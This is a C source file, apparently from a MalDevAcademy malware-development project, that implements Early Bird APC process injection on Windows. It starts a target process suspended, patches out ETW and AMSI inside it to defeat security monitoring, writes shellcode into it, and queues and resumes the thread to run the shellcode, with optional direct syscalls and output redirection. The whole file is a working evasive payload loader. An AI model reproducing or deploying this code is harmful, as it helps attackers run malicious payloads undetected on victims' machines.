// @NUL0x4C | @mrd0x : MalDevAcademy

#include "injectors.h"


BOOL EarlyBirdApcInjection(HANDLE hProcess, HANDLE hThread, LPWSTR szProcessName, PBYTE pPayload, SIZE_T sPayloadSize) {
	DWORD		dwProcessId		= 0;
	PVOID		pAddress		= NULL;
    NTSTATUS	STATUS          = 0;
    PROCESS_INFORMATION pi;
    HANDLE		hStdOutRead		= NULL,
                hStdOutWrite	= NULL;

#if defined(REDIRECT_OUTPUT)
    SECURITY_ATTRIBUTES  saAttr;
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &saAttr, 0)){
        DebugPrint("StdoutRd CreatePipe: %d\n", GetLastError());
		return FALSE;
	}

    if (!SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0)) {
        DebugPrint("Stdout SetHandleInformation: %d\n", GetLastError());
        return FALSE;
    }
#endif

//	creating target remote process (in debugged state)
	DebugPrint("[i] Creating \"%ls\" Process As A Debugged Process ...\n", szProcessName);

    if (!CreateSuspendedProcess(szProcessName, &pi, hStdOutWrite, hStdOutWrite)) {
		DebugPrint("[!] CreateSuspendedProcess Failed With Error : %d \n", GetLastError());
        return FALSE;
	}

    dwProcessId = pi.dwProcessId;
    hProcess = pi.hProcess;
    hThread = pi.hThread;

	DebugPrint("[i] Suspended Process Created With Pid : %d \n", dwProcessId);
	DebugPrint("[+] DONE \n\n");

    //	apply ETW bypass
    if (!applyEtwBypass(hProcess)) {
        DebugPrint("[!] Failed To Apply ETW Bypass \n");
        return FALSE;
    }

    //	apply AMSI bypass
	if (!applyAmsiBypass(hProcess)) {
		DebugPrint("[!] Failed To Apply AMSI Bypass \n");
		CloseHandle(hThread);
		return FALSE;
	}

// injecting the payload and getting the base address of it
	DebugPrint("[i] Writing Shellcode To The Target Process ...\n");
	if (!payload_loading(&pAddress, pPayload, sPayloadSize, hProcess, szProcessName)) {
		return FALSE;
	}
	DebugPrint("[+] DONE \n\n");

//	running QueueUserAPC
#ifdef SYSCALL_ENABLED
    if ((STATUS = NtQueueApcThread(hThread, pAddress, NULL, NULL, 0)) != 0) {
        DebugPrint("[!] NtQueueApcThread Failed With Error : 0x%0.8X \n", STATUS);
        return FALSE;
    }
    DebugPrint("[+] DONE \n");
#else
    QueueUserAPC((PAPCFUNC)pAddress, hThread, (ULONG_PTR)NULL);
#endif

    DebugPrint("[i] Resuming The Suspended Thread ...\n");
    ULONG suspendCount = 0;

#ifdef SYSCALL_ENABLED
    if ((STATUS = NtResumeThread(hThread, &suspendCount)) != 0) {
        DebugPrint("[!] NtResumeThread Failed With Error: 0x%0.8X \n", STATUS);
        return FALSE;
    }
#else
    suspendCount = ResumeThread(hThread);
	if (suspendCount == (DWORD)-1) {
		DebugPrint("[!] ResumeThread Failed With Error: %d \n", GetLastError());
		return FALSE;
	}
#endif
    DebugPrint("[+] Thread Resumed Successfully \n\n");

    // Optional: Wait for the injected code to execute
    Sleep(2000);
	DebugPrint("[+] DONE \n\n");

#if defined(REDIRECT_OUTPUT)
    ReadFromRemotePipe(hStdOutRead);
#endif

// Closing the handles to the process and thread
	CloseHandle(hProcess);
	CloseHandle(hThread);
    CloseHandle(hStdOutRead);
    CloseHandle(hStdOutWrite);

	return TRUE;
}